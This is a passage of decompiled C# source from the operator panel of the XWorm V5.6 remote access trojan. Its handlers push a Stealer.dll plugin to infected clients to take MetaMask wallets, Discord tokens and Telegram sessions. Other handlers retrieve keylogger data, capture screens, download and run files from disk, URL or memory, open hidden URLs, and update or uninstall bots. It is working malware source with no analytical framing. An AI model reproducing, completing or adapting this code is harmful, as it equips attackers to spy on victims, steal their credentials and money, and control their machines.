        this.ii.Images.SetKeyName(130, "LT.png");
        this.ii.Images.SetKeyName(131, "LU.png");
        this.ii.Images.SetKeyName(132, "LV.png");
        this.ii.Images.SetKeyName(133, "LY.png");
        this.ii.Images.SetKeyName(134, "MA.png");
        this.ii.Images.SetKeyName(135, "MC.png");
        this.ii.Images.SetKeyName(136, "MD.png");
        this.ii.Images.SetKeyName(137, "ME.png");
        this.ii.Images.SetKeyName(138, "MF.png");
        this.ii.Images.SetKeyName(139, "MG.png");
        this.ii.Images.SetKeyName(140, "MH.png");
        this.ii.Images.SetKeyName(141, "MK.png");
        this.ii.Images.SetKeyName(142, "ML.png");
        this.ii.Images.SetKeyName(143, "MM.png");
        this.ii.Images.SetKeyName(144, "MN.png");
        this.ii.Images.SetKeyName(145, "MO.png");
        this.ii.Images.SetKeyName(146, "MP.png");
        this.ii.Images.SetKeyName(147, "MQ.png");
        this.ii.Images.SetKeyName(148, "MR.png");
        this.ii.Images.SetKeyName(149, "MS.png");
        this.ii.Images.SetKeyName(150, "MT.png");
        this.ii.Images.SetKeyName(151, "MU.png");
        this.ii.Images.SetKeyName(152, "MV.png");
        this.ii.Images.SetKeyName(153, "MW.png");
        this.ii.Images.SetKeyName(154, "MX.png");
        this.ii.Images.SetKeyName(155, "MY.png");
        this.ii.Images.SetKeyName(156, "MZ.png");
        this.ii.Images.SetKeyName(157, "NA.png");
        this.ii.Images.SetKeyName(158, "NC.png");
        this.ii.Images.SetKeyName(159, "NE.png");
        this.ii.Images.SetKeyName(160, "NF.png");
        this.ii.Images.SetKeyName(161, "NG.png");
        this.ii.Images.SetKeyName(162, "NI.png");
        this.ii.Images.SetKeyName(163, "NL.png");
        this.ii.Images.SetKeyName(164, "NO.png");
        this.ii.Images.SetKeyName(165, "NP.png");
        this.ii.Images.SetKeyName(166, "NR.png");
        this.ii.Images.SetKeyName(167, "NU.png");
        this.ii.Images.SetKeyName(168, "NZ.png");
        this.ii.Images.SetKeyName(169, "OM.png");
        this.ii.Images.SetKeyName(170, "PA.png");
        this.ii.Images.SetKeyName(171, "PE.png");
        this.ii.Images.SetKeyName(172, "PF.png");
        this.ii.Images.SetKeyName(173, "PG.png");
        this.ii.Images.SetKeyName(174, "PH.png");
        this.ii.Images.SetKeyName(175, "PK.png");
        this.ii.Images.SetKeyName(176, "PL.png");
        this.ii.Images.SetKeyName(177, "PN.png");
        this.ii.Images.SetKeyName(178, "PR.png");
        this.ii.Images.SetKeyName(179, "PS.png");
        this.ii.Images.SetKeyName(180, "PT.png");
        this.ii.Images.SetKeyName(181, "PW.png");
        this.ii.Images.SetKeyName(182, "PY.png");
        this.ii.Images.SetKeyName(183, "QA.png");
        this.ii.Images.SetKeyName(184, "RO.png");
        this.ii.Images.SetKeyName(185, "RS.png");
        this.ii.Images.SetKeyName(186, "RU.png");
        this.ii.Images.SetKeyName(187, "RW.png");
        this.ii.Images.SetKeyName(188, "SA.png");
        this.ii.Images.SetKeyName(189, "SB.png");
        this.ii.Images.SetKeyName(190, "SC.png");
        this.ii.Images.SetKeyName(191, "SD.png");
        this.ii.Images.SetKeyName(192, "SE.png");
        this.ii.Images.SetKeyName(193, "SG.png");
        this.ii.Images.SetKeyName(194, "SH.png");
        this.ii.Images.SetKeyName(195, "SI.png");
        this.ii.Images.SetKeyName(196, "SK.png");
        this.ii.Images.SetKeyName(197, "SL.png");
        this.ii.Images.SetKeyName(198, "SM.png");
        this.ii.Images.SetKeyName(199, "SN.png");
        this.ii.Images.SetKeyName(200, "SO.png");
        this.ii.Images.SetKeyName(201, "SR.png");
        this.ii.Images.SetKeyName(202, "SS.png");
        this.ii.Images.SetKeyName(203, "ST.png");
        this.ii.Images.SetKeyName(204, "SV.png");
        this.ii.Images.SetKeyName(205, "SY.png");
        this.ii.Images.SetKeyName(206, "SZ.png");
        this.ii.Images.SetKeyName(207, "TC.png");
        this.ii.Images.SetKeyName(208, "TD.png");
        this.ii.Images.SetKeyName(209, "TF.png");
        this.ii.Images.SetKeyName(210, "TG.png");
        this.ii.Images.SetKeyName(211, "TH.png");
        this.ii.Images.SetKeyName(212, "TJ.png");
        this.ii.Images.SetKeyName(213, "TK.png");
        this.ii.Images.SetKeyName(214, "TL.png");
        this.ii.Images.SetKeyName(215, "TM.png");
        this.ii.Images.SetKeyName(216, "TN.png");
        this.ii.Images.SetKeyName(217, "TO.png");
        this.ii.Images.SetKeyName(218, "TR.png");
        this.ii.Images.SetKeyName(219, "TT.png");
        this.ii.Images.SetKeyName(220, "TV.png");
        this.ii.Images.SetKeyName(221, "TW.png");
        this.ii.Images.SetKeyName(222, "TZ.png");
        this.ii.Images.SetKeyName(223, "UA.png");
        this.ii.Images.SetKeyName(224, "UG.png");
        this.ii.Images.SetKeyName(225, "US.png");
        this.ii.Images.SetKeyName(226, "UY.png");
        this.ii.Images.SetKeyName(227, "UZ.png");
        this.ii.Images.SetKeyName(228, "VA.png");
        this.ii.Images.SetKeyName(229, "VC.png");
        this.ii.Images.SetKeyName(230, "VE.png");
        this.ii.Images.SetKeyName(231, "VG.png");
        this.ii.Images.SetKeyName(232, "VI.png");
        this.ii.Images.SetKeyName(233, "VN.png");
        this.ii.Images.SetKeyName(234, "VU.png");
        this.ii.Images.SetKeyName(235, "WF.png");
        this.ii.Images.SetKeyName(236, "WS.png");
        this.ii.Images.SetKeyName(237, "YE.png");
        this.ii.Images.SetKeyName(238, "YT.png");
        this.ii.Images.SetKeyName(239, "ZA.png");
        this.ii.Images.SetKeyName(240, "ZM.png");
        this.ii.Images.SetKeyName(241, "ZW.png");




        base.Opacity = 0.0;
		Lv2.Visible = false;
		Lv3.Visible = false;
		Lv4.Visible = false;
		SetWindowTheme(Lv1.Handle, "explorer", null);
		Module0.smethod_19(this, 20);
	}

	private void Main_Load(object sender, EventArgs e)
	{
		Guna2HtmlToolTip1.SetToolTip(Guna2Button1, "Clients");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button2, "Logs");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button3, "Tasks");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button4, "Screens");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button5, "About");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button6, "Extra Tools");
		Guna2HtmlToolTip1.SetToolTip(Guna2Button7, "Builder");
	}

	public object method_0()
	{
		_Closure_0024__758_002D0 arg = default(_Closure_0024__758_002D0);
		_Closure_0024__758_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__758_002D0(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_clients = new List<GClass5>();
		Invoke((Delegate0)([SpecialName] () =>
		{
			object object_ = GClass19.object_0;
			ObjectFlowControl.CheckForSyncLockOnValueType(object_);
			bool lockTaken = false;
			try
			{
				Monitor.Enter(object_, ref lockTaken);
				foreach (ListViewItem selectedItem in CS_0024_003C_003E8__locals0._0024VB_0024Me.Lv1.SelectedItems)
				{
					CS_0024_003C_003E8__locals0._0024VB_0024Local_clients.Add((GClass5)selectedItem.Tag);
				}
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(object_);
				}
			}
		}));
		return CS_0024_003C_003E8__locals0._0024VB_0024Local_clients.ToArray();
	}

	private void Timer_Status_Tick(object sender, EventArgs e)
	{
		try
		{
            

            ToolStripStatusLabel1.Text = $"Clients [{Lv1.Items.Count.ToString()}]   Selected [{Lv1.SelectedItems.Count.ToString()}]   Port [{GClass19.int_0}]   Key [{GClass19.string_1}]   Sent [{Module0.smethod_11(GClass19.long_1)}]   Received [{Module0.smethod_11(GClass19.long_0)}]   Expiry [{GClass19.string_5}]";
			Text = checked("XWorm V5.6 Edition @" + GClass19.string_3 + " " + "   " +  DateTime.Now.ToLongTimeString() + "   CPU " + Conversions.ToString((int)Math.Round(performanceCounter1.NextValue())) + "%   RAM " + Conversions.ToString((int)Math.Round(performanceCounter2.NextValue()))) + "%";
			if (GClass19.int_1 > 50)
			{
				Guna2NotificationPaint1.Text = "+50";
			}
			else if (GClass19.int_1 == 0)
			{
				Guna2NotificationPaint1.Text = GClass19.int_1.ToString();
			}
			else
			{
				Guna2NotificationPaint1.Text = "+" + GClass19.int_1;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer_Ping_Tick(object sender, EventArgs e)
	{
		if (GClass19.gclass5s_0.Count > 0)
		{
			byte[] array = Module0.smethod_6("PING!");
			_Closure_0024__R760_002D0 closure_0024__R760_002D = default(_Closure_0024__R760_002D0);
			foreach (GClass5 item in GClass19.gclass5s_0.ToList())
			{
				closure_0024__R760_002D = new _Closure_0024__R760_002D0(closure_0024__R760_002D);
				closure_0024__R760_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R760_002D._Lambda_0024__R2, array);
			}
		}
		GC.Collect();
	}

	private void Lv1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			ListViewHitTestInfo listViewHitTestInfo = Lv1.HitTest(e.Location);
			if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
			{
				Lv1.Items[listViewHitTestInfo.Item.Index].Selected = true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Lv1_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.Modifiers != Keys.Control || e.KeyCode != Keys.A || Lv1.Items.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem item in Lv1.Items)
			{
				item.Selected = true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void NotifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		try
		{
			base.TopMost = true;
			base.WindowState = FormWindowState.Normal;
			base.TopMost = false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Main_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			NotifyIcon1.Visible = false;
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1()
	{
		try
		{
			Lv1.Visible = false;
			Lv3.Visible = false;
			Lv4.Visible = false;
			Lv2.Visible = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_766_TimerTask_Tick))]
	[DebuggerStepThrough]
	private void TimerTask_Tick(object sender, EventArgs e)
	{
		VB_0024StateMachine_766_TimerTask_Tick stateMachine = new VB_0024StateMachine_766_TimerTask_Tick();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_sender = sender;
		stateMachine._0024VB_0024Local_e = e;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void method_2(string id)
	{
		foreach (ListViewItem item in Lv3.Items)
		{
			if (Operators.CompareString(item.ToolTipText, id, TextCompare: false) == 0)
			{
				int num = Convert.ToInt32(item.SubItems[1].Text);
				num = checked(num + 1);
				item.SubItems[1].Text = num.ToString();
			}
		}
	}

	private bool method_3(string id)
	{
		foreach (ListViewItem item in Lv3.Items)
		{
			if (Operators.CompareString(item.ToolTipText, id, TextCompare: false) == 0)
			{
				return true;
			}
		}
		return false;
	}

	private void ThumbnailCap_Tick(object sender, EventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("$Cap");
			_Closure_0024__R769_002D4 closure_0024__R769_002D = default(_Closure_0024__R769_002D4);
			foreach (GClass5 item in GClass19.gclass5s_0.ToList())
			{
				closure_0024__R769_002D = new _Closure_0024__R769_002D4(closure_0024__R769_002D);
				closure_0024__R769_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R769_002D._Lambda_0024__R6, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Lv4_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void Main_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Lv1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void Guna2Button1_Click(object sender, EventArgs e)
	{
		try
		{
			Lv2.Visible = false;
			Lv3.Visible = false;
			Lv4.Visible = false;
			Lv1.Visible = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2Button2_Click(object sender, EventArgs e)
	{
		try
		{
			Lv1.Visible = false;
			Lv3.Visible = false;
			Lv4.Visible = false;
			Lv2.Visible = true;
			GClass19.int_1 = 0;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2Button3_Click(object sender, EventArgs e)
	{
		try
		{
			Lv1.Visible = false;
			Lv2.Visible = false;
			Lv4.Visible = false;
			Lv3.Visible = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2Button4_Click(object sender, EventArgs e)
	{
		try
		{
			Lv1.Visible = false;
			Lv2.Visible = false;
			Lv3.Visible = false;
			Lv4.Visible = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			base.TopMost = true;
			base.WindowState = FormWindowState.Normal;
			base.TopMost = false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		Process.Start(Application.ExecutablePath);
		Close();
	}

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		try
		{
			GClass19.bool_1 = false;
			ThumbnailCap.Dispose();
			Lv4.Items.Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		GClass19.bool_1 = true;
		ThumbnailCap.Enabled = true;
		ThumbnailCap.Start();
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		Lv2.Items.Clear();
	}

	private void Guna2Button5_Click(object sender, EventArgs e)
	{
		About about = new About();
		about.StartPosition = FormStartPosition.CenterParent;
		about.ShowDialog();
	}

	private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode != Keys.Return)
		{
			return;
		}
		e.SuppressKeyPress = true;
		try
		{
			if (Lv1.Items.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in Lv1.SelectedItems)
			{
				selectedItem.Selected = false;
			}
			bool flag = false;
			string value = Guna2TextBox1.Text.ToLower();
			foreach (ListViewItem item in Lv1.Items)
			{
				try
				{
					string text = item.SubItems[0].Text.ToLower();
					string text2 = item.SubItems[2].Text.ToLower();
					string text3 = item.SubItems[3].Text.ToLower();
					string text4 = item.SubItems[5].Text.ToLower();
					string text5 = item.SubItems[10].Text.ToLower();
					string text6 = item.SubItems[11].Text.ToLower();
					string text7 = item.SubItems[12].Text.ToLower();
					string text8 = item.SubItems[14].Text.ToLower();
					string text9 = item.SubItems[17].Text.ToLower();
					if (text.Contains(value) | text2.Contains(value) | text3.Contains(value) | text4.Contains(value) | text5.Contains(value) | text6.Contains(value) | text7.Contains(value) | text8.Contains(value) | text9.Contains(value))
					{
						item.Selected = true;
						flag = true;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (flag)
			{
				Lv1.EnsureVisible(Lv1.SelectedItems[0].Index);
				Guna2TextBox1.Clear();
				if (!Lv1.Visible)
				{
					Lv2.Visible = false;
					Lv3.Visible = false;
					Lv4.Visible = false;
					Lv1.Visible = true;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2Button6_Click(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				ToolsBox toolsBox = new ToolsBox();
				toolsBox.StartPosition = FormStartPosition.Manual;
				toolsBox.Location = new Point(base.Location.X + unchecked(base.Width / 2) - unchecked(toolsBox.Width / 2), base.Location.Y + unchecked(base.Height / 2) - unchecked(toolsBox.Height / 2));
				if (Application.OpenForms[toolsBox.Name] == null)
				{
					toolsBox.Show();
				}
				else
				{
					Application.OpenForms[toolsBox.Name].Focus();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Debug.WriteLine(ex.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Guna2Button7_Click(object sender, EventArgs e)
	{
		Builder builder = new Builder();
		builder.StartPosition = FormStartPosition.CenterParent;
		builder.ShowDialog();
	}

	private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv3.Items.Count > 0)
		{
			foreach (ListViewItem item in Lv3.Items)
			{
				if (Operators.CompareString(item.Text, "Get Keylogger", TextCompare: false) == 0)
				{
					return;
				}
			}
		}
		ListViewItem listViewItem = new ListViewItem();
		listViewItem.Text = "Get Keylogger";
		listViewItem.SubItems.Add("0");
		listViewItem.ToolTipText = Guid.NewGuid().ToString();
		Lv3.Items.Add(listViewItem);
		Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
		byte[] msgPack = Module0.smethod_6("OfflineGet");
		gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
	}

	private void VisibleToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		object obj = Interaction.InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com");
		if (!string.IsNullOrWhiteSpace(Conversions.ToString(obj)))
		{
			byte[] msgPack = Module0.smethod_6(Conversions.ToString(Operators.ConcatenateObject("Urlopen" + GClass19.string_0, obj)));
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = Conversions.ToString(Operators.ConcatenateObject("VisibleUrl: ", obj));
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
	}

	private void InvisibleToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		object obj = Interaction.InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com");
		if (!string.IsNullOrWhiteSpace(Conversions.ToString(obj)))
		{
			byte[] msgPack = Module0.smethod_6(Conversions.ToString(Operators.ConcatenateObject("Urlhide" + GClass19.string_0, obj)));
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = Conversions.ToString(Operators.ConcatenateObject("InvisibleUrl: ", obj));
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
	}

	private void MetaMaskToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			if (Lv3.Items.Count > 0)
			{
				foreach (ListViewItem item in Lv3.Items)
				{
					if (Operators.CompareString(item.Text, "MetaMask", TextCompare: false) == 0)
					{
						return;
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "MetaMask";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(5));
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DiscordTokenToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Lv3.Items.Count > 0)
			{
				foreach (ListViewItem item in Lv3.Items)
				{
					if (Operators.CompareString(item.Text, "DiscordToken", TextCompare: false) == 0)
					{
						return;
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "DiscordToken";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(2));
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void TelegramSessionToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Lv3.Items.Count > 0)
			{
				foreach (ListViewItem item in Lv3.Items)
				{
					if (Operators.CompareString(item.Text, "TelegramSession", TextCompare: false) == 0)
					{
						return;
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "TelegramSession";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Stealer.dll") + GClass19.string_0 + Conversions.ToString(4));
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FromDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.*)|*.*";
			openFileDialog2.Title = "From Disk";
			openFileDialog2 = null;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				byte[] msgPack = Module0.smethod_6("DW" + GClass19.string_0 + Path.GetExtension(openFileDialog.FileName) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName))));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "FromDisk: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				Lv3.Items.Add(listViewItem);
				Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FromLinkToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string defaultResponse = "http://www.example.com/File.exe";
		string text = Interaction.InputBox("Url", "From Url", defaultResponse);
		string text2 = Interaction.InputBox("Extension", "From Url", ".exe");
		if (!((text.Length == 0) | (text2.Length == 0)))
		{
			byte[] msgPack = Module0.smethod_6("LN" + GClass19.string_0 + text2 + GClass19.string_0 + text);
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "FromLink: " + text2;
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
	}

	private void FromMemoryToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe)|*.exe";
			openFileDialog2.Title = "From Memory";
			openFileDialog2 = null;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
					ProjectData.ClearProjectError();
					return;
				}
				byte[] msgPack = Module0.smethod_6("FM" + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName))));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "FromMemory: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				Lv3.Items.Add(listViewItem);
				Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void UpdateAllClientsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			try
			{
				byte[] msgPack = Module0.smethod_6("update" + GClass19.string_0 + Path.GetExtension(openFileDialog.FileName) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName))));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				Lv3.Items.Add(listViewItem);
				Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				MessageBox.Show(ex.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RemoveTaskToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv3.SelectedItems.Count <= 0)
		{
			return;
		}
		foreach (ListViewItem selectedItem in Lv3.SelectedItems)
		{
			selectedItem.Remove();
		}
	}

	private void InformationToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Informations.dll"));
			_Closure_0024__R799_002D6 closure_0024__R799_002D = default(_Closure_0024__R799_002D6);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R799_002D = new _Closure_0024__R799_002D6(closure_0024__R799_002D);
				closure_0024__R799_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R799_002D._Lambda_0024__R8, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("rec");
		_Closure_0024__R800_002D8 closure_0024__R800_002D = default(_Closure_0024__R800_002D8);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R800_002D = new _Closure_0024__R800_002D8(closure_0024__R800_002D);
			closure_0024__R800_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R800_002D._Lambda_0024__R10, array);
		}
	}

	private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("CLOSE");
		_Closure_0024__R801_002D10 closure_0024__R801_002D = default(_Closure_0024__R801_002D10);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R801_002D = new _Closure_0024__R801_002D10(closure_0024__R801_002D);
			closure_0024__R801_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R801_002D._Lambda_0024__R12, array);
		}
	}

	private void UninstallToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0 || MessageBox.Show("Are You Sure?", "Uninstall!", MessageBoxButtons.YesNo) != DialogResult.Yes)
		{
			return;
		}
		byte[] array = Module0.smethod_6("uninstall");
		_Closure_0024__R802_002D12 closure_0024__R802_002D = default(_Closure_0024__R802_002D12);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
